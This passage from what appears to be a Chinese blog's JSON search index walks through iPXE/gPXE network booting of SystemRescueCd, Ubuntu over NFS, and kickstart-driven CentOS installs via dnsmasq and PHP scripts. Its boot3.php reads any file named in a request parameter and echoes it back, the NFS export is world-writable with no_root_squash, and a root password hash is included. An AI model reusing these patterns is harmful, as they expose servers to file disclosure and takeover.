/var/www/html/ks/sysrcd  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp -r /mnt/iso/* /var/www/html/ks/sysrcd  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e重头戏，依然按前面的方法修改boot2.php即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexplode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e,\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ifopen net0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/ip \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[0]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/netmask \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[2]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/gateway \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[1]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/dns \u003c/span\u003e\u003cspan class=\"nv\"\u003e$dns\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set base-url http://172.16.8.1/ks/sysrcd\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel \\${base-url}/isolinux/rescue32 netboot=\\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ebase\u003c/span\u003e\u003cspan class=\"p\"\u003e-url\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/isolinux/initram.igz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，静态ip的设置部分，还有同时设置了sshd和vncserver，方便远程操作。\u003c/p\u003e","title":"IPXE远程运行sysrecuecd系统"},{"content":"有了上篇IPXE的启动方法，我们来启动一个Ubuntu来玩：\n简单的修改boot2.php即可：\ncase \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\\n\u0026#34;; echo \u0026#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; 注意：变的就是kernel和init那两行，netboot支持nfs和cifs，不支持http啊，试了半天！另外ip那一行，如果是动态的，ip=dhcp，如果是静态的，格式如下：\nip=客户端ip:服务器端ip:网关:掩码:主机名:网卡\n服务器端ip不填，主机名也可以不填。\n首先我们要去下个ISO\nwget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso 然后把vmlinuz.efi和initrd.lz弄出来，放到[http://172.16.8.1/ks/ubuntu]目录下\nmount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso cp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu cp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu 然后建立nfs，把iso里的东西都弄到nfs共享里去：\nmkdir -p /export/ubuntu vi /etc/exports /export/ubuntu *(rw,sync,no_subtree_check,fsid=0,no_root_squash) yum install -y nfs-utils rpcbind service nfs start ok，启动pxe，就看到桌面了。 ","permalink":"https://rendoumi.com/posts/20240118-pxe_utuntu_desk/","summary":"\u003cp\u003e有了上篇IPXE的启动方法，我们来启动一个Ubuntu来玩：\u003c/p\u003e\n\u003cp\u003e简单的修改boot2.php即可：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexplode\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e,\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ifopen net0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/ip \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[0]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/netmask \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[2]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/gateway \u003c/span\u003e\u003cspan class=\"nv\"\u003e$ipa\u003c/span\u003e\u003cspan class=\"s2\"\u003e[1]\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set net0/dns \u003c/span\u003e\u003cspan class=\"nv\"\u003e$dns\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel http://172.16.8.1/ks/ubuntu/vmlinuz.efi root=/dev/nfs boot=casper netboot=nfs nfsroot=172.16.11.6:/root/ubuntu ip=172.16.36.2::172.16.37.254:255.255.254.0:renhe-16-36-2:eno1 ro\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/ubuntu/initrd.lz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：变的就是\u003ccode\u003ekernel\u003c/code\u003e和\u003ccode\u003einit\u003c/code\u003e那两行，netboot支持nfs和cifs，不支持http啊，试了半天！另外ip那一行，如果是动态的，ip=dhcp，如果是静态的，格式如下：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eip=客户端ip:服务器端ip:网关:掩码:主机名:网卡\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e服务器端ip不填，主机名也可以不填。\u003c/p\u003e\n\u003cp\u003e首先我们要去下个ISO\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/ubuntu-releases/16.04/ubuntu-16.04-desktop-amd64.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后把vmlinuz.efi和initrd.lz弄出来，放到[\u003ca href=\"http://172.16.8.1/ks/ubuntu\"\u003ehttp://172.16.8.1/ks/ubuntu\u003c/a\u003e]目录下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -o loop ubuntu-16.04-desktop-amd64.iso /mnt/iso  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /mnt/iso/casper/vmlinuz.efi /var/www/html/ks/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp /mnt/iso/casper/initrd.lz /var/www/html/ks/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后建立nfs，把iso里的东西都弄到nfs共享里去：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /export/ubuntu  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/exports  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/export/ubuntu *\u003cspan class=\"o\"\u003e(\u003c/span\u003erw,sync,no_subtree_check,fsid\u003cspan class=\"o\"\u003e=\u003c/span\u003e0,no_root_squash\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y nfs-utils rpcbind  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice nfs start  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，启动pxe，就看到桌面了。\n\u003cimg alt=\"image-20240118135302316\" loading=\"lazy\" src=\"/posts/20240118-pxe_utuntu_desk/image-20240118135302316.png\"\u003e\u003c/p\u003e","title":"用IPXE启动个Ubuntu桌面"},{"content":"这些年IDC物理机装机的大法也在不断衍进，从最早的手动装一堆tftp/dhcp/syslinux/httpd，到cobbler的一统江湖，到现在的dnsmasq轻量级安装，nocps安装，一直在不断进化着。\n因为cobbler实在太重，不得不专门起一个kvm虚机来运行，完全不喜欢啊。所以一直也在研究终极安装服务器的大法。\n折腾服务器无数回，找出了个自己比较喜欢的方式。\n首先介绍一下背景知识：\nPXE 可以通过网络给计算机安装操作系统。 PXE协议大致上结合了DHCP和TFTP。\ngPXE gPXE是PXE的一个开源实现（更早的实现是Etherboot）。通过gPXE能让网卡直接支持网络启动，而不依赖于网卡自带的PXE固件。同时相比PXE，gPXE支持更多的协议。 传统的PXE只能通过TFTP进行传输，而gPXE支持HTTP，iSCSI和ATA over Ethernet（AoE），甚至支持wifi链接。\niPXE iPXE表示 it doesn\u0026rsquo;t PXE。iPXE是gPXE的原班人马写的（他们从Etherboot开始），作为官方的gPXE的替代品。 gPXE扩展的功能在iPXE中都得到支持。 之所以不再使用gPXE是由于存在版权纠纷，iPXE从2010年4月开始，基于同一个代码库开始开发。\nPXELINUX Syslinux是一个优秀的系统启动加载器(bootloader)，可引导自硬盘、光盘、和通过PXE的网络启动。 PXELINUX派生自Syslinux，用来使支持PXE的网卡从网络引导启动Linux。PXELINUX程序不是烧在网卡里，而是存储在TFTP服务器上。\nChainloading iPXE 可以把iPXE当作固件刷进计算机网卡的ROM里替换掉自带的PXE，但更为常见的是通过chainloading的方式进入iPXE。\n有点晕是吧，总结一下，pxe包含了gpxe/ipxe/pxelinux，ipxe是最新的，gpxe/ipxe/pxelinux可以通过chain的方式顶替网卡原生的pxe。\n推荐的装机方式：\n客户机启动网卡自带的固件pxe，然后去服务器拉一个gpxe/ipxe，然后启动这个gpxe/ipxe，再去服务器拉具体的启动文件，这种就是chain方式了。我们就可以用到http/iscsi/wifi等各种先进方式启动了。\n我们第一步先要准备一个gpxe的boot文件。\n解释一下，文件后缀有.pxe/.kpxe/.kkpxe，这是个递进关系，.pxe是最原生的网卡驱动，.kpxe包含了调用原生网卡的UNDI驱动(无网卡驱动），.kkpxe更进一步，包含了UNDI+PXE原生网卡的驱动。\n当然选择.kpxe了，我们的目的就是通过这个ipxe调用原生网卡上的驱动即可，如果是你自己要烧网卡的bootroom片子，就得选择所有驱动了。\n这样我们会得到一个 gpxe-1.0.1-undionly.kpxe 的文件，保存备用。\n然后我们来设置Dnsmasq:\nlog-dhcp dhcp-no-override enable-tftp tftp-root = /tftpboot dhcp-range=tftp,172.16.36.100,172.16.36.105 dhcp-match=gpxe,175 dhcp-boot=net:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 dhcp-boot=http://172.16.8.1/ks/boot.txt 注意：gpxe-1.0.1-undionly.kpxe是放在/tftpboot/gpxe/之下的\n上面有很多玄机，dhcp-range是随便设一个地址池，因为最终实际是gpxe来决定地址，所以第一次dhcp得到的地址反而不重要了。dhcp-no-override一定要有，否则gpxe有bug，无法启动。\n其次匹配gpxe，凡是175的都是gpxe，为什么要匹配呢？看下面，有两个dhcp-boot启动选项，#pxe，#表示不是，这行意思是:不是gpxe启动的话用/tftp/gpxe/gpxe-1.0.1-undionly.kpxe来启动，dhcp的server是172.16.36.1。第二行如果是gpxe启动的话，就chain到[http://172.16.8.1/ks/boot.txt]去启动\n呵呵，如果不这么设置，就用一行的话：\ndhcp-boot=gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1 就会陷入死循环，首先pxe启动，抓了个gpxe，gpxe又启动抓了个gpxe，又抓gpxe，循环往复没玩没了。所以必须标记gpxe，并跳出这个循环。\n我们在172.16.8.1上面建立/centos7的yum安装源，同时建立/ks目录。准备boot.txt，boot2.php，boot3.php，centos7.ks四个文件，下面一个一个解释：\n首先是boot.txt\ncat boot.txt #!gpxe chain http://172.16.8.1/ks/boot2.php?uuid=\\${uuid}\u0026amp;mac=\\${mac}\u0026amp;busid=\\${busid}\u0026amp;ip=\\${ip}\u0026amp;hostname=\\${hostname:uristring}\u0026amp;serial=\\${serial:uristring}\u0026amp;asset=\\${asset:uristring}\u0026amp;manufacturer=\\${manufacturer:uristring}\u0026amp;product=\\${product:uristring} 大家看上面，boot.txt是个gpxe脚本，实际是让gpxe向boot2.php传输了一些数据过来，有机器的uuid/mac/busid/hostname/serial/product等等。给个具体的例子，从access.log看到实际发过来的请求如下：\n\u0026#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532\u0026amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40\u0026amp;busid=%5C01%3A80%3A86%3A15%3A21\u0026amp;ip=%5C172.16.36.100\u0026amp;hostname=%5C\u0026amp;serial=%5C1VTBC52\u0026amp;asset=%5C\u0026amp;manufacturer=%5CDell%20Inc.\u0026amp;product=%5CPowerEdge%20R730 HTTP/1.0\u0026#34; 200 46 \u0026#34;-\u0026#34; \u0026#34;gPXE/1.0.1\u0026#34; \u0026#34;-\u0026#34; 看上面，有很多信息，网卡的物理地址，还有serial，对应dell就是svc tag号，还有机器类别PowerEdge R730，这是个好东西啊。\n我们购买机器的时候肯定有序列号，上架到机房的时候，可以让idc抄下来机柜和序列号，然后我们让网管规划好ip，再这里就可以利用serial来确定机器应该按哪个模板安装。\n再看模板文件，centos7.ks\n#version=DEVEL auth --enableshadow --passalgo=sha512 url --url=http://172.16.8.1/centos7 text firstboot --enable ignoredisk --only-use=sda keyboard --vckeymap=us --xlayouts=\u0026#39;us\u0026#39; lang en_US.UTF-8 selinux --disabled services --enabled=\u0026#34;chronyd\u0026#34; network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway={gateway} --ip={ip} --nameserver=172.16.8.1 --netmask={netmask} network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no network --hostname={hostname} #grub-crypt --sha-512 rootpw --iscrypted $6$0Y.SH935/jvt0X.D$lCte9H/KiFeGbTGrrcuXGZXmnq3Rk4Crz8nAvCgH.Pf2SNmoUdh.g5WGWJqtVO4QTyqvnXc/6FyVjptWIaM4w1 timezone Asia/Shanghai --isUtc bootloader --append=\u0026#34; crashkernel=auto\u0026#34; --location=mbr --boot-drive=sda clearpart --all --drives=sda part /boot --fstype ext4 --size=500 --ondisk=/dev/sda part swap --size=8192 --ondisk=/dev/sda part / --fstype ext4 --size=1024 --grow --ondisk=/dev/sda %packages @compat-libraries @core wget net-tools chrony bridge-utils %end %post yum -y erase NetworkManager cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/sysconfig/network-scripts/ifcfg-br0 DEVICE=br0 TYPE=Bridge BOOTPROTO=static ONBOOT=yes IPADDR={ip} NETMASK={netmask} GATEWAY={gateway} EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/modprobe.d/bonding.conf alias bond0 bonding BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0 ONBOOT=yes USERCTL=no BRIDGE=br0 EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysconfig/network-scripts/ifcfg-em2 DEVICE=em2 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF %end reboot 注意上面，{ip}、{netmask}、{gateway}、{hostname}是待定的。\n然后看看boot2.php:\n\u0026lt;?php $dns=\u0026#39;172.16.8.1\u0026#39;; $base7=\u0026#39;http://172.16.8.1/centos7\u0026#39;; $ks7=\u0026#39;http://172.16.8.1/ks/boot3.php\u0026#39;; echo \u0026#34;#!gpxe\\n\u0026#34;; switch ($_REQUEST[\u0026#39;mac\u0026#39;]) { case \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;set base-url $base7\\n\u0026#34;; echo \u0026#34;kernel \\${base-url}/images/pxeboot/vmlinuz\\n\u0026#34;; echo \u0026#34;imgargs vmlinuz inst.ks=$ks7?file=centos7.ks\u0026amp;ip=$ipa[0]\u0026amp;mask=$ipa[2]\u0026amp;gateway=$ipa[1]\u0026amp;hostname=$ipa[3] ksdevice=bootif inst.vnc inst.vncpassword=xxxxxxxx inst.sshd\\n\u0026#34;; echo \u0026#34;initrd \\${base-url}/images/pxeboot/initrd.img\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; case \u0026#39;00:11:22:33:44:55\u0026#39;: # boot from iSCSI echo \u0026#34;set initiator-iqn iqn.2007-08.com.example.initiator:initiator\\n\u0026#34;; # see http://ipxe.org/sanuri for the syntax echo \u0026#34;sanboot iscsi:san.example.com:6:3260:0:iqn.2007-08.com.example.san:sometarget\\n\u0026#34;; break; case \u0026#39;\\00:77:21:ab:cd:ee\u0026#39;: # boot boot.salstar.sk\u0026#39;s super cool boot menu echo \u0026#34;chain http://boot.salstar.sk\\n\u0026#34;; break; default: # exit iPXE and let machine go on with BIOS boot sequence echo \u0026#34;exit\\n\u0026#34;; break; } ?\u0026gt; 注意上面，我们是通过网卡的物理地址来判断模板的，用svc tag号更好。\n第四个文件：boot3.php\n\u0026lt;?php $origin_str = file_get_contents($_REQUEST[\u0026#39;file\u0026#39;]); $update_str = str_replace(\u0026#34;{ip}\u0026#34;, $_REQUEST[\u0026#39;ip\u0026#39;], $origin_str); $update_str = str_replace(\u0026#39;{netmask}\u0026#39;, $_REQUEST[\u0026#39;mask\u0026#39;], $update_str); $update_str = str_replace(\u0026#39;{gateway}\u0026#39;, $_REQUEST[\u0026#39;gateway\u0026#39;], $update_str); $update_str = str_replace(\u0026#39;{hostname}\u0026#39;, $_REQUEST[\u0026#39;hostname\u0026#39;], $update_str); echo $update_str; ?\u0026gt; boot3.php的功能就是替换掉模板文件里的ip等，然后返回一个正确的ks文件。\n这下就完美了，我们基本就需要修改ks下的boot2.php和centos7.ks，就可以控制远程安装了。\ndhcp和tftp，就用dnsmasq和那一个gxpe就够了，省了大事了。\n还有更好玩的: 网卡原生pxe\u0026ndash;\u0026gt;gpxe\u0026ndash;\u0026gt;pxelinux.0\n大家尽情想象吧。\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_install/","summary":"\u003cp\u003e这些年IDC物理机装机的大法也在不断衍进，从最早的手动装一堆tftp/dhcp/syslinux/httpd，到cobbler的一统江湖，到现在的dnsmasq轻量级安装，nocps安装，一直在不断进化着。\u003c/p\u003e\n\u003cp\u003e因为cobbler实在太重，不得不专门起一个kvm虚机来运行，完全不喜欢啊。所以一直也在研究终极安装服务器的大法。\u003c/p\u003e\n\u003cp\u003e折腾服务器无数回，找出了个自己比较喜欢的方式。\u003c/p\u003e\n\u003cp\u003e首先介绍一下背景知识：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePXE\n可以通过网络给计算机安装操作系统。 PXE协议大致上结合了DHCP和TFTP。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003egPXE\ngPXE是PXE的一个开源实现（更早的实现是Etherboot）。通过gPXE能让网卡直接支持网络启动，而不依赖于网卡自带的PXE固件。同时相比PXE，gPXE支持更多的协议。 传统的PXE只能通过TFTP进行传输，而gPXE支持HTTP，iSCSI和ATA over Ethernet（AoE），甚至支持wifi链接。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eiPXE\niPXE表示 it doesn\u0026rsquo;t PXE。iPXE是gPXE的原班人马写的（他们从Etherboot开始），作为官方的gPXE的替代品。  gPXE扩展的功能在iPXE中都得到支持。 